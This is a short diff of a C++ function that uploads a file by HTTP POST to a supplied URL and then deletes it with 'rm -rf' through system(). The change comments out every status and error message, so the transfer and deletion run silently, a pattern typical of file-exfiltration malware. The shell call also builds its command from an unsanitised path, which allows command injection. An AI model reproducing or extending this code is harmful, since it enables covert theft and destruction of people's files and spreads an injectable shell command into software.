@@ -46,16 +46,16 @@ size_t SendFileWithPostRequest(const string& url, const string& filePath) {
 void CheckAndSendFile(const string& url, const string& filePath) {
     ifstream file(filePath, ios::binary | ios::ate);
     if (file.is_open()) {
-        cout << "Sending file...\n";
+        // cout << "Sending file...\n";
         if (SendFileWithPostRequest(url, filePath) == CURLE_OK) {
-            cout << "File sent successfully.\n";
+            // cout << "File sent successfully.\n";
             string cmd = "rm -rf " + filePath;
             system(cmd.c_str());
         } else {
-            cerr << "Failed to send file.\n";
+            // cerr << "Failed to send file.\n";
         }
         file.close();
     } else {
-        cerr << "Unable to open file: " << filePath << endl;
+        // cerr << "Unable to open file: " << filePath << endl;
     }
 }
